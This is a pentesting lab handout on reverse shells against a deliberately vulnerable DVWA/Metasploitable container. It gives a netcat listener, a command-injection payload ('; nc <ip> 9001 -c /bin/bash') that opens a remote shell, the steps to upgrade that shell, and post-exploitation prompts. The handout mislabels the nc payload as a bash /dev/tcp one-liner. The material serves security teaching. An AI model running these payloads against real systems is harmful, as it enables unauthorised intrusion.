# Lab 1 - Reverse Shells

## What is a reverse shell?

To start, let's ask the question, what is a shell? According to
Wikipedia[^1],

>In computing, a shell is a computer program that exposes an operating 
>system's services to a human user or other programs.

[^1]: https://en.wikipedia.org/wiki/Shell\_(computing)

Any time you open the "terminal" or the "command prompt" on a computer, you are
interfacing with the operating system via the shell.

You may already have some familiarity with shells, either through other labs or
classes.

Often, we will interact with remote computers via a shell session, e.g. `ssh`
or `PuTTY`. In these programs, you will typically authenticate to a remote
server and receive a shell session over the network.  This is a very common
use-case for shells.

Hopefully, you understand why it's important that a user authenticates before
receiving a shell session.  If just anyone could log in, they could do some
serious damage to the system, either intentionally or unintentionally.

In the normal use case of a remote shell, the target machine is typically
deliberately accessible, meaning the SSH port (default 22/tcp) is deliberately
exposed to the internet.

A _reverse shell_, on the other hand, is a technique used to gain access to
remote machines which are otherwise directly inacessible via normal methods.
Typically, reverse shells are gained by exploiting some other service, for
example a vulnerable PHP web application hosted on a web server.  It may be the
case that the only port(s) exposed to the "attacker" are the web ports, either
80 or 443.  To gain the reverse shell, the attacker exploits a weakness in the
web application to "send back" a shell to the attacking machine, often through
a firewall.[^revshell]

[^revshell]: https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/

With a reverse shell, attackers can explore the target machine, exploiting
weaknesses that will eventually lead them to escalate privileges to the `root`
user.


## Goals for this lab

- Identify indicators of when a reverse shell can be exploited
- Exploit a PHP web app to gain a reverse shell
- Learn how to "upgrade" the shell


# Lab Setup 

For this lab, we will be using the
[tleemcjr/metasploitable2](https://hub.docker.com/r/tleemcjr/metasploitable2)
Docker image.  This image contains an instance of [Damn Vulnerable Web
App](https://github.com/digininja/DVWA), among other deliberately vulnerable
web platforms used for pentesting education.

## Virtual Environment Network Setup

We'll be using the Kali and SEED Ubuntu VMs for this lab.  They will both need
to be on the same network.

The simplest way to accomplish this in VirtualBox is to put each of these
machines on the VirtualBox "NAT Network".  

1. Open VM VirtualBox Manager
2. Right-click your machine and select "Settings"
3. On the "Network" tab, change the "Attached to" option to "NAT Network"
4. Click the OK button to save the changes.
5. Repeat this process with each machine on the lab

Doing this makes sure the lab machines are on the same network and have
outbound connections to the Internet (which will be required to pull the Docker
image for this lab).

## SEED Ubuntu 20.04 VM

### Setting up metasploitable image

1. Clone this repository to the SEED Ubuntu 20.04 VM.
2. Navigate to `n2h-red/01-Reverse\ Shells`
3. Pull and run the `teemjcjr/metasploitable2` image with the command `docker
   compose up`.  This image is around 4GB, so stretch your legs or something
   while you wait.

Once this image is running, **Leave this window open**.

```bash
# clone the repo
git clone https://github.com/Cybersecurity-Student-Association/n2h-red.git

# navigate to the lab directory
cd n2h-red/01-Reverse\ Shells

# pull and run the docker image
# LEAVE THIS WINDOW OPEN
docker compose up
```


## Kali

Ensure your Kali VM is booted and on the same network as the SEED Ubuntu VM
(see [Lab Setup](#lab-setup)).

# Lab objectives

Rather than give you step-by-step instructions, most of what I'd like you to do
is explore.  Get some practice taking notes and screenshots - a good
guideline for notes and screenshots is to imagine you're writing a manual for
someone who has no knowledge about computers, like a grandparent. What would
they need to see and read to be able to replicate your steps?


## Intelligence Gathering

1. From Kali, how do you determine which services/ports are available on the
   SEED Ubuntu VM?  Which ports/services are available? 
2. Go find the DVWA instance on the SEED Ubuntu VM. Are there any exposed
   credentials along the way?  Can they be used to log in to the target machine, 
   e.g.  via `ssh` or `telnet`?  Consider why or why not - we'll answer this
   defniitively in the Post Exploitation phase.
3. Log in to the DVWA app. You will need the default credentials, which can be
   found online.  You could probably guess them.
4. From the menu on the left, choose "DVWA Security".  Change the "Script
   Security" setting to "low" and push Submit.  You'll see the change in the
   bottom left of the site `Security level: low`

## Vulnerability Analysis 

5. From the menu on the left, choose "Command Execution". Test the intended
   functionality of this page - try to ping your Kali machine IP address, for
   example.  From Kali, how can you determine whether you're being pinged from
   the target?
6. Now try to see what else you can do with this vulnerability.  Think about
   what the name "Command Execution" suggests.  Consider what you know already
   about the "back end" system - what must be executing the `ping` command?
   Use the "View Source" button to explore this page's source code.
7. How can you use this vulnerability to learn more about the back end system
   on the server?


## Exploitation - Reverse Shells

Hopefully, you've learned (or guessed) that the vulnerability here is that
whatever you pass to this form is passed directly to a shell on the server.
This is what's known as remote code execution (RCE), or sometimes arbitrary
code execution.  Essentially, this means we can run commands on the server as
whatever user the web service is running as.

This means that we can send a reverse shell back to the attacker.

Reverse shells require two elements:

1. a "listener" on the attacker
2. RCE to initiate the shell connection on the target

The most basic listener uses the common Linux Netcat utility. To exploit this
page for a remote shell, on the attacker, perform these actions:

### Step 1 - set up a listener on the attacker
```bash
# set up listener
nc -lvnp 9001
```

Optional: Research what each of these flags mean.  Can you use any port on the
attacker machine?  Why or why not?

### Step 2 - exploit RCE to initiate the reverse shell

In your browser on the "Command Execution" vulnerability page, enter this in
the field and press submit. **NOTE**: be sure to replace the IP address with
your attacker's IP address, and the port (9001) with the port you used to set
up your listener in Step 1.

```
8.8.8.8; nc 172.16.0.9 9001 -c /bin/bash
```

This breaks down as follows:

- `8.8.8.8`: the IP address to send to the underlying `ping` command
- `; nc 172.16.0.9 9001 -c /bin/bash`: the _injected_ reverse shell payload

The payload we're using here is a netcat reverse shell.  This is just one type
of reverse shell.  There are lots of online resources for generating reverse
shells.  There are tons of resources online for reverse shells, but two worth
bookmarking are listed below.

- [revshells.com](https://www.revshells.com/)
- [Pentest Monkey Revshell Cheat
  Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

The payload we're using here is a "bash one-liner" that makes use of the
built-in TCP file redirection functionality of `bash` shells since version 4 or
so.  This is the reverse shell; it opens a TCP connection to the specified
IP:port combination, and redirects all output to that
connection.[^bash-one-liner]

[^bash-one-liner]: https://hypothetical.me/post/reverse-shell-in-bash/#summary

## Indicators of success

The most obvious indicator of success is you will see a "Received connection
from" message in your listener.

Another indicator is that the web page you exploited will "hang". That is,
normally you'd get the output of the `ping` command and a chance to test
another address.  When the reverse shell is successful, the web page doesn't do
this, but might just look like it's loading and loading.  This is a good sign.

### Protip: upgrading the shell

Reverse shells are useful, but they have some limitations.  For example, the
key combination <Ctrl-C> is a very common way to terminate a command in the
shell.  But, if you try this key combination in the reverse shell, you'll kill
the shell and have to reestablish that connection, which can sometimes be very
cumbersome.

A common technique to upgrade a reverse shell is to use the Python TTY module.
[This video](https://youtube.com/watch?v=Fxq6oZ-H-xI&t=1205) shows an example
of how to execute the shell upgrade.

```bash
# set up listener
nc -lvnp 9001
listening on [any] 9001 ...
Connection received from [some IP] <some port number>

# invoke python TTY module
python -c 'import pty;pty.spawn("/bin/bash")'

# press <ctrl-z> to background the session
# you'll be back in the 'kali' shell for these steps
stty raw -echo; fg # push <enter> twice

# now you're back in the reverse shell
export TERM=xterm
```

By following these steps, you'll have a "full" shell with tab autocompletion,
the ability to clear the screen with <CTRL-L>, and pressing <CTRL-C> won't kill
the shell.

## Post Exploitation

Now that you have access to a shell on the target, see what you can learn about
the target system.

- how many other users are on this machine?  how do you know?
- are there any other listening services/ports? (hint: use the `ss` and
  `netstat` utilities)
- what is the IP address of the exploited machine?  is this address the same as
  the one you used to access the website?  why or why not?  if not, what does
  this suggest?
- what other programs are running? do any of them jump out as privilege
  escalation vectors?  i.e., if we exploit them for a shell, which user will be
  running that shell?

We'll cover privilege escalation techniques in another lab, but I'd like you to
start thinking about it.

## Reporting

In the note-taking app of your choosing, document the steps you took to exploit
this page to gain a reverse shell.  Remember, you'll want screenshots, and
you'll want to write steps down so that someone following your notes could
reproduce them.

This isn't for a grade or anything, but it's good practice.  "Perfect practice
makes perfect."

# Bonus Tasks

- Try some of the other reverse shells from the resources above. Not all will
  work.  If they don't work, see what you can find out about why that would be.
- Explore the other web apps and attempt to identify and exploit command
  injection sites for a reverse shell.

